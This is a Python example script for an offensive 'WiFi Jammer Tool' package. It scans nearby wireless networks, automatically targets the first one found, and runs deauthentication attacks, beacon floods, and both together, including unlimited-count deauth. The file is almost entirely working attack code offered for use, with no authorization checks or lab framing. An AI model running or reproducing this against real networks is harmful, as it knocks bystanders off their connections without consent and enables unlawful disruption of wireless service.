#!/usr/bin/env python3
"""
Example usage of WiFi Jammer Tool programmatically.
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from wifi_jammer.core.interfaces import AttackType, AttackConfig
from wifi_jammer.scanner import ScapyNetworkScanner
from wifi_jammer.factory import AttackFactory
from wifi_jammer.utils import RichLogger


def example_scan_and_attack():
    """Example: Scan networks and perform deauth attack."""
    
    # Initialize components
    logger = RichLogger()
    scanner = ScapyNetworkScanner(logger)
    factory = AttackFactory()
    
    # Get available interfaces
    interfaces = scanner.get_interface_list()
    if not interfaces:
        logger.error("No wireless interfaces found!")
        return
    
    logger.info(f"Available interfaces: {interfaces}")
    
    # Scan for networks
    interface = interfaces[0]  # Use first available interface
    logger.info(f"Scanning networks on {interface}...")
    
    networks = scanner.scan_networks(interface)
    
    if not networks:
        logger.warning("No networks found!")
        return
    
    # Display found networks
    logger.info(f"Found {len(networks)} networks:")
    for i, network in enumerate(networks, 1):
        logger.info(f"{i}. {network.ssid or 'Hidden'} ({network.bssid}) - Ch{network.channel}")
    
    # Select first network as target
    target_network = networks[0]
    logger.info(f"Targeting: {target_network.ssid} ({target_network.bssid})")
    
    # Create attack configuration
    config = AttackConfig(
        attack_type=AttackType.DEAUTH,
        target_bssid=target_network.bssid,
        target_ssid=target_network.ssid,
        channel=target_network.channel,
        interface=interface,
        count=10,  # Send 10 packets
        delay=0.5,  # 0.5 second delay
        verbose=True
    )
    
    # Create and execute attack
    attack = factory.create_attack(AttackType.DEAUTH)
    
    logger.info("Starting deauth attack...")
    if attack.execute(config):
        logger.success("Attack started successfully!")
        
        # Let it run for a few seconds
        import time
        time.sleep(5)
        
        # Stop the attack
        attack.stop()
        logger.info("Attack stopped")
    else:
        logger.error("Failed to start attack!")


def example_beacon_flood():
    """Example: Beacon flood attack."""
    
    logger = RichLogger()
    factory = AttackFactory()
    
    # Create beacon flood configuration
    config = AttackConfig(
        attack_type=AttackType.BEACON_FLOOD,
        target_bssid="",  # Not needed for beacon flood
        interface="wlan0",  # Replace with your interface
        count=50,  # Send 50 packets
        delay=0.1,  # 0.1 second delay
        verbose=True
    )
    
    # Create and execute attack
    attack = factory.create_attack(AttackType.BEACON_FLOOD)
    
    logger.info("Starting beacon flood attack...")
    if attack.execute(config):
        logger.success("Beacon flood started!")
        
        # Run for 10 seconds
        import time
        time.sleep(10)
        
        attack.stop()
        logger.info("Beacon flood stopped")
    else:
        logger.error("Failed to start beacon flood!")


def example_multiple_attacks():
    """Example: Run multiple attacks simultaneously."""
    
    logger = RichLogger()
    factory = AttackFactory()
    
    # Create multiple attack configurations
    attacks = []
    
    # Deauth attack
    deauth_config = AttackConfig(
        attack_type=AttackType.DEAUTH,
        target_bssid="00:11:22:33:44:55",  # Replace with target
        interface="wlan0",
        count=0,  # Unlimited
        delay=1.0,
        verbose=False
    )
    
    # Beacon flood
    beacon_config = AttackConfig(
        attack_type=AttackType.BEACON_FLOOD,
        target_bssid="",
        interface="wlan0",
        count=0,
        delay=0.5,
        verbose=False
    )
    
    # Start attacks
    for config in [deauth_config, beacon_config]:
        attack = factory.create_attack(config.attack_type)
        if attack.execute(config):
            attacks.append(attack)
            logger.success(f"Started {config.attack_type.value} attack")
        else:
            logger.error(f"Failed to start {config.attack_type.value} attack")
    
    # Let them run
    import time
    time.sleep(10)
    
    # Stop all attacks
    for attack in attacks:
        attack.stop()
    
    logger.info("All attacks stopped")


if __name__ == "__main__":
    print("WiFi Jammer Tool - Example Usage")
    print("=" * 40)
    
    # Check if running as root
    if os.geteuid() != 0:
        print("❌ This script requires root privileges. Run with sudo.")
        sys.exit(1)
    
    # Run examples
    try:
        print("\n1. Scan and Deauth Attack:")
        example_scan_and_attack()
        
        print("\n2. Beacon Flood Attack:")
        example_beacon_flood()
        
        print("\n3. Multiple Attacks:")
        example_multiple_attacks()
        
    except KeyboardInterrupt:
        print("\n⚠️  Examples interrupted by user")
    except Exception as e:
        print(f"\n❌ Error: {e}") 